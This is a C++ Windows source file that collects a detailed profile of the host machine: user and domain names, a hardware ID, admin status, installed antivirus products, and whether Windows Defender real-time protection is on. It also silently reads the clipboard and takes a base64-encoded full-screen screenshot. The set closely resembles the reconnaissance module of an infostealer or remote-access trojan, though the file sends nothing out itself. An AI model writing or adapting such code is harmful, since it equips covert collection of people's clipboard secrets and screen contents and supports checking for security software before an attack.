#include "system_info.h"
#include <windows.h>
#include <wbemidl.h>
#include <oleauto.h>
#include <lmcons.h>
#include <lm.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "netapi32.lib")

// Helper function to convert BSTR to std::string
static std::string bstr_to_string(BSTR bstr) {
    if (!bstr) return "";
    int len = SysStringLen(bstr);
    if (len == 0) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, bstr, len, nullptr, 0, nullptr, nullptr);
    std::string result(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, bstr, len, &result[0], size_needed, nullptr, nullptr);
    return result;
}

// Helper to run WMI query and get string result
static std::string wmi_query_string(IWbemServices* pServices, const wchar_t* query, const wchar_t* property) {
    std::string result;
    
    IEnumWbemClassObject* pEnumerator = nullptr;
    BSTR bstrQuery = SysAllocString(query);
    
    if (SUCCEEDED(pServices->ExecQuery(SysAllocString(L"WQL"), bstrQuery,
                   WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                   nullptr, &pEnumerator))) {
        
        IWbemClassObject* pclsObj = nullptr;
        ULONG uReturn = 0;
        
        if (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK) {
            VARIANT vtProp;
            VariantInit(&vtProp);
            if (SUCCEEDED(pclsObj->Get(property, 0, &vtProp, nullptr, nullptr))) {
                if (vtProp.vt == VT_BSTR) {
                    result = bstr_to_string(vtProp.bstrVal);
                }
            }
            VariantClear(&vtProp);
            pclsObj->Release();
        }
        pEnumerator->Release();
    }
    SysFreeString(bstrQuery);
    
    return result;
}

// Get installation path of the executable
static std::string get_installation_path() {
    char path[MAX_PATH];
    if (GetModuleFileNameA(nullptr, path, MAX_PATH)) {
        return std::string(path);
    }
    return "";
}

// Get computer name
static std::string get_computer_name() {
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return std::string(name);
    }
    return "";
}

// Get hostname
static std::string get_hostname() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        return std::string(hostname);
    }
    return get_computer_name();
}

// Get username
static std::string get_username() {
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "";
}

// Get domain
static std::string get_domain() {
    WKSTA_INFO_100* pBuf = nullptr;
    std::string domain;
    
    if (NetWkstaGetInfo(nullptr, 100, (LPBYTE*)&pBuf) == NERR_Success) {
        if (pBuf->wki100_langroup) {
            int len = WideCharToMultiByte(CP_UTF8, 0, pBuf->wki100_langroup, -1, nullptr, 0, nullptr, nullptr);
            domain.resize(len - 1);
            WideCharToMultiByte(CP_UTF8, 0, pBuf->wki100_langroup, -1, &domain[0], len, nullptr, nullptr);
        }
        NetApiBufferFree(pBuf);
    }
    return domain;
}

// Get HWID (based on disk serial and motherboard)
static std::string get_hwid() {
    std::string hwid;
    
    // Get volume serial number of C drive
    DWORD volumeSerial = 0;
    if (GetVolumeInformationA("C:\\", nullptr, 0, &volumeSerial, nullptr, nullptr, nullptr, 0)) {
        std::stringstream ss;
        ss << std::hex << std::uppercase << volumeSerial;
        hwid = ss.str();
    }
    
    // Get computer name as part of HWID
    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(compName);
    if (GetComputerNameA(compName, &size)) {
        hwid += "-" + std::string(compName);
    }
    
    return hwid;
}

// Get OS install date
static std::string get_os_install_date(IWbemServices* pServices) {
    std::string installDate = wmi_query_string(pServices, 
        L"SELECT InstallDate FROM Win32_OperatingSystem", L"InstallDate");
    
    if (installDate.length() >= 8) {
        // Format: YYYYMMDDHHMMSS.mmmmmm+UUU -> YYYY-MM-DD
        return installDate.substr(0, 4) + "-" + installDate.substr(4, 2) + "-" + installDate.substr(6, 2);
    }
    return installDate;
}

// Get timezone
static std::string get_timezone() {
    TIME_ZONE_INFORMATION tzi;
    DWORD result = GetTimeZoneInformation(&tzi);
    
    if (result != TIME_ZONE_ID_INVALID) {
        // Convert wide string to narrow
        int len = WideCharToMultiByte(CP_UTF8, 0, tzi.StandardName, -1, nullptr, 0, nullptr, nullptr);
        std::string tzName(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, tzi.StandardName, -1, &tzName[0], len, nullptr, nullptr);
        
        // Add UTC offset
        int bias = -(tzi.Bias);
        int hours = bias / 60;
        int mins = abs(bias % 60);
        
        std::stringstream ss;
        ss << tzName << " (UTC" << (hours >= 0 ? "+" : "") << hours;
        if (mins > 0) ss << ":" << std::setfill('0') << std::setw(2) << mins;
        ss << ")";
        
        return ss.str();
    }
    return "";
}

// Get system language
static std::string get_system_language() {
    LANGID langId = GetUserDefaultUILanguage();
    char langName[256];
    
    if (GetLocaleInfoA(MAKELCID(langId, SORT_DEFAULT), LOCALE_SENGLANGUAGE, langName, sizeof(langName))) {
        return std::string(langName);
    }
    return "";
}

// Check if running as admin
static bool is_elevated() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

// Get antivirus info from WMI
static std::vector<AntivirusInfo> get_antivirus_info() {
    std::vector<AntivirusInfo> avList;
    
    CoInitialize(nullptr);
    
    IWbemLocator* pLocator = nullptr;
    if (FAILED(CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                                IID_IWbemLocator, (LPVOID*)&pLocator))) {
        return avList;
    }
    
    IWbemServices* pServices = nullptr;
    BSTR bstrNamespace = SysAllocString(L"ROOT\\SecurityCenter2");
    
    if (SUCCEEDED(pLocator->ConnectServer(bstrNamespace, nullptr, nullptr, nullptr,
                                          0, nullptr, nullptr, &pServices))) {
        
        CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                         nullptr, RPC_C_AUTHN_LEVEL_CALL,
                         RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
        
        IEnumWbemClassObject* pEnumerator = nullptr;
        BSTR bstrQuery = SysAllocString(L"SELECT displayName, productState FROM AntiVirusProduct");
        
        if (SUCCEEDED(pServices->ExecQuery(SysAllocString(L"WQL"), bstrQuery,
                       WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                       nullptr, &pEnumerator))) {
            
            IWbemClassObject* pclsObj = nullptr;
            ULONG uReturn = 0;
            
            while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK) {
                AntivirusInfo av;
                
                VARIANT vtName, vtState;
                VariantInit(&vtName);
                VariantInit(&vtState);
                
                if (SUCCEEDED(pclsObj->Get(L"displayName", 0, &vtName, nullptr, nullptr))) {
                    av.name = bstr_to_string(vtName.bstrVal);
                }
                
                if (SUCCEEDED(pclsObj->Get(L"productState", 0, &vtState, nullptr, nullptr))) {
                    DWORD state = vtState.uintVal;
                    // Decode productState - bits 12-15 indicate if enabled
                    bool enabled = ((state >> 12) & 0xF) == 0x1;
                    av.enabled = enabled;
                    av.status = enabled ? "Enabled" : "Disabled";
                }
                
                VariantClear(&vtName);
                VariantClear(&vtState);
                
                if (!av.name.empty()) {
                    avList.push_back(av);
                }
                
                pclsObj->Release();
            }
            pEnumerator->Release();
        }
        SysFreeString(bstrQuery);
        pServices->Release();
    }
    SysFreeString(bstrNamespace);
    pLocator->Release();
    
    return avList;
}

// Get Windows Defender status
static std::string get_defender_status() {
    HKEY hKey;
    std::string status = "Unknown";
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                     "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        DWORD disabled = 0;
        DWORD size = sizeof(disabled);
        if (RegQueryValueExA(hKey, "DisableRealtimeMonitoring", nullptr, nullptr,
                            (LPBYTE)&disabled, &size) == ERROR_SUCCESS) {
            status = disabled ? "Disabled" : "Enabled";
        } else {
            status = "Enabled"; // Default if key doesn't exist
        }
        RegCloseKey(hKey);
    }
    
    return status;
}

// Get clipboard content
static std::string get_clipboard_content() {
    std::string content;
    
    if (OpenClipboard(nullptr)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText) {
                content = pszText;
                // Limit to 10KB
                if (content.length() > 10240) {
                    content = content.substr(0, 10240) + "...[truncated]";
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
    
    return content;
}

// Capture screenshot and return as base64
static std::string capture_screenshot() {
    std::string result;
    
    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Create compatible DC and bitmap
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    // Copy screen to bitmap
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    
    // Create bitmap info
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screenWidth;
    bi.biHeight = -screenHeight; // Negative for top-down
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    // Calculate row size (must be multiple of 4)
    int rowSize = ((screenWidth * 3 + 3) & ~3);
    int imageSize = rowSize * screenHeight;
    
    // Get bitmap data
    std::vector<BYTE> pixels(imageSize);
    GetDIBits(hMemoryDC, hBitmap, 0, screenHeight, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    // Create BMP file in memory
    BITMAPFILEHEADER bfh;
    bfh.bfType = 0x4D42; // "BM"
    bfh.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
    bfh.bfReserved1 = 0;
    bfh.bfReserved2 = 0;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    std::vector<BYTE> bmpData(bfh.bfSize);
    memcpy(bmpData.data(), &bfh, sizeof(BITMAPFILEHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels.data(), imageSize);
    
    // Base64 encode
    DWORD encodedSize = 0;
    CryptBinaryToStringA(bmpData.data(), (DWORD)bmpData.size(),
                        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &encodedSize);
    
    if (encodedSize > 0) {
        result.resize(encodedSize);
        CryptBinaryToStringA(bmpData.data(), (DWORD)bmpData.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &encodedSize);
        result.resize(encodedSize);
    }
    
    // Cleanup
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    
    return result;
}

std::optional<SystemInfo> get_system_info() {
    try {
        SystemInfo sysInfo;

        // Get installation path
        sysInfo.installationPath = get_installation_path();
        
        // Get computer identity
        sysInfo.computerName = get_computer_name();
        sysInfo.hostname = get_hostname();
        sysInfo.netbiosName = get_computer_name(); // Same as computer name on Windows
        sysInfo.username = get_username();
        sysInfo.domain = get_domain();
        sysInfo.hwid = get_hwid();
        
        // Get time/locale info
        sysInfo.timeZone = get_timezone();
        sysInfo.systemLanguage = get_system_language();
        
        // Get elevation status
        sysInfo.isElevated = is_elevated();
        
        // Get antivirus info
        sysInfo.antiviruses = get_antivirus_info();
        sysInfo.windowsDefenderStatus = get_defender_status();
        
        // Get clipboard
        sysInfo.clipboard = get_clipboard_content();
        
        // Capture screenshot
        try {
            sysInfo.screenshot = capture_screenshot();
        } catch (...) {}

        // Initialize COM for WMI queries
        CoInitialize(nullptr);
        
        IWbemLocator* pLocator = nullptr;
        CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                        IID_IWbemLocator, (LPVOID*)&pLocator);
        
        if (pLocator) {
            IWbemServices* pServices = nullptr;
            BSTR bstrNamespace = SysAllocString(L"ROOT\\CIMV2");
            pLocator->ConnectServer(bstrNamespace, nullptr, nullptr, nullptr,
                                   0, nullptr, nullptr, &pServices);
            SysFreeString(bstrNamespace);
            
            if (pServices) {
                CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                                 nullptr, RPC_C_AUTHN_LEVEL_CALL,
                                 RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
                
                // Get OS install date
                sysInfo.osInstallDate = get_os_install_date(pServices);
                
                // Get network domain
                sysInfo.networkDomain = wmi_query_string(pServices,
                    L"SELECT Domain FROM Win32_ComputerSystem", L"Domain");
                
                pServices->Release();
            }
            pLocator->Release();
        }
        
        CoUninitialize();

        // Get CPU info
        sysInfo.cpu = get_cpu_info();

        // Get GPU info
        sysInfo.gpu = get_gpu_info();

        // Get RAM info
        sysInfo.ram = get_ram_info();

        // Get OS info
        sysInfo.os = get_os_info();
        
        // Get OS architecture
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        sysInfo.osArchitecture = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "64-bit" : "32-bit";

        return sysInfo;
    } catch (const std::exception&) {
        return std::nullopt;
    }
}

std::optional<CpuInfo> get_cpu_info() {
    try {
        CpuInfo cpuInfo;

        // Use GetSystemInfo to get basic processor info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        cpuInfo.cores = sysInfo.dwNumberOfProcessors;

        // Get processor info using registry
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                         "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                         0, KEY_READ, &hKey) == ERROR_SUCCESS) {

            char processorName[256] = {0};
            DWORD size = sizeof(processorName);
            if (RegQueryValueExA(hKey, "ProcessorNameString", nullptr, nullptr,
                                (LPBYTE)processorName, &size) == ERROR_SUCCESS) {
                cpuInfo.name = processorName;
            } else {
                cpuInfo.name = "Unknown Processor";
            }

            // Get vendor
            char vendor[256] = {0};
            size = sizeof(vendor);
            if (RegQueryValueExA(hKey, "VendorIdentifier", nullptr, nullptr,
                                (LPBYTE)vendor, &size) == ERROR_SUCCESS) {
                cpuInfo.vendor = vendor;
            } else {
                cpuInfo.vendor = "Unknown";
            }

            // Get max clock speed
            DWORD maxClock = 0;
            size = sizeof(maxClock);
            if (RegQueryValueExA(hKey, "~MHz", nullptr, nullptr,
                                (LPBYTE)&maxClock, &size) == ERROR_SUCCESS) {
                cpuInfo.maxClockSpeed = std::to_string(maxClock) + " MHz";
            } else {
                cpuInfo.maxClockSpeed = "Unknown";
            }

            RegCloseKey(hKey);
        }

        // Get architecture
        switch (sysInfo.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64:
                cpuInfo.architecture = "x64";
                break;
            case PROCESSOR_ARCHITECTURE_INTEL:
                cpuInfo.architecture = "x86";
                break;
            case PROCESSOR_ARCHITECTURE_ARM64:
                cpuInfo.architecture = "ARM64";
                break;
            case PROCESSOR_ARCHITECTURE_ARM:
                cpuInfo.architecture = "ARM";
                break;
            default:
                cpuInfo.architecture = "Unknown";
                break;
        }

        // Get thread count (logical processors)
        cpuInfo.threads = sysInfo.dwNumberOfProcessors;

        return cpuInfo;
    } catch (const std::exception&) {
        return std::nullopt;
    }
}

std::vector<GpuInfo> get_gpu_info() {
    std::vector<GpuInfo> gpus;

    try {
        CoInitialize(nullptr);

        IWbemLocator* pLocator = nullptr;
        CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                        IID_IWbemLocator, (LPVOID*)&pLocator);

        if (pLocator) {
            IWbemServices* pServices = nullptr;

            BSTR bstrNamespace = SysAllocString(L"ROOT\\CIMV2");
            pLocator->ConnectServer(bstrNamespace, nullptr, nullptr, nullptr,
                                   0, nullptr, nullptr, &pServices);
            SysFreeString(bstrNamespace);

            if (pServices) {
                CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                                 nullptr, RPC_C_AUTHN_LEVEL_CALL,
                                 RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

                BSTR bstrQuery = SysAllocString(L"SELECT Name, DriverVersion, AdapterRAM FROM Win32_VideoController");
                IEnumWbemClassObject* pEnumerator = nullptr;

                pServices->ExecQuery(SysAllocString(L"WQL"), bstrQuery,
                                   WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                   nullptr, &pEnumerator);
                SysFreeString(bstrQuery);

                if (pEnumerator) {
                    IWbemClassObject* pclsObj = nullptr;
                    ULONG uReturn = 0;

                    while (pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn) == S_OK) {
                        GpuInfo gpu;

                        VARIANT vtProp;
                        VariantInit(&vtProp);
                        if (pclsObj->Get(L"Name", 0, &vtProp, nullptr, nullptr) == S_OK) {
                            gpu.name = bstr_to_string(vtProp.bstrVal);
                        }
                        VariantClear(&vtProp);

                        VariantInit(&vtProp);
                        if (pclsObj->Get(L"DriverVersion", 0, &vtProp, nullptr, nullptr) == S_OK) {
                            gpu.driverVersion = bstr_to_string(vtProp.bstrVal);
                        }
                        VariantClear(&vtProp);

                        VariantInit(&vtProp);
                        if (pclsObj->Get(L"AdapterRAM", 0, &vtProp, nullptr, nullptr) == S_OK) {
                            if (VT_I4 == vtProp.vt || VT_UI4 == vtProp.vt) {
                                DWORD ramBytes = vtProp.uintVal;
                                if (ramBytes > 0) {
                                    double ramGB = ramBytes / (1024.0 * 1024.0 * 1024.0);
                                    char buffer[32];
                                    sprintf_s(buffer, "%.2f GB", ramGB);
                                    gpu.memory = buffer;
                                }
                            }
                        }
                        VariantClear(&vtProp);

                        if (!gpu.name.empty() && gpu.name != "Unknown") {
                            gpus.push_back(gpu);
                        }

                        pclsObj->Release();
                    }

                    pEnumerator->Release();
                }

                pServices->Release();
            }

            pLocator->Release();
        }

        CoUninitialize();

    } catch (const std::exception&) {
    }

    return gpus;
}

std::optional<std::string> get_ram_info() {
    try {
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        if (GlobalMemoryStatusEx(&memInfo)) {
            double ramGB = memInfo.ullTotalPhys / (1024.0 * 1024.0 * 1024.0);
            char buffer[32];
            sprintf_s(buffer, "%.2f GB", ramGB);
            return std::string(buffer);
        }
    } catch (const std::exception&) {
    }
    return std::nullopt;
}

std::optional<std::string> get_os_info() {
    try {
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);

        // Use RtlGetVersion for accurate version (GetVersionEx lies on Win10+)
        typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVersion) {
                RTL_OSVERSIONINFOW rovi = {0};
                rovi.dwOSVersionInfoSize = sizeof(rovi);
                if (pRtlGetVersion(&rovi) == 0) {
                    osvi.dwMajorVersion = rovi.dwMajorVersion;
                    osvi.dwMinorVersion = rovi.dwMinorVersion;
                    osvi.dwBuildNumber = rovi.dwBuildNumber;
                }
            }
        }

        std::string osName;
        SYSTEM_INFO sysInfo;
        GetNativeSystemInfo(&sysInfo);
        std::string arch = (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";

        if (osvi.dwMajorVersion == 10) {
            if (osvi.dwBuildNumber >= 22000) {
                osName = "Windows 11";
            } else {
                osName = "Windows 10";
            }
        } else if (osvi.dwMajorVersion == 6) {
            if (osvi.dwMinorVersion == 3) {
                osName = "Windows 8.1";
            } else if (osvi.dwMinorVersion == 2) {
                osName = "Windows 8";
            } else if (osvi.dwMinorVersion == 1) {
                osName = "Windows 7";
            } else if (osvi.dwMinorVersion == 0) {
                osName = "Windows Vista";
            }
        } else {
            osName = "Windows";
        }

        char buffer[128];
        sprintf_s(buffer, "%s Build %d (%s)",
                 osName.c_str(), osvi.dwBuildNumber, arch.c_str());
        return std::string(buffer);
    } catch (const std::exception&) {
    }
    return std::nullopt;
}
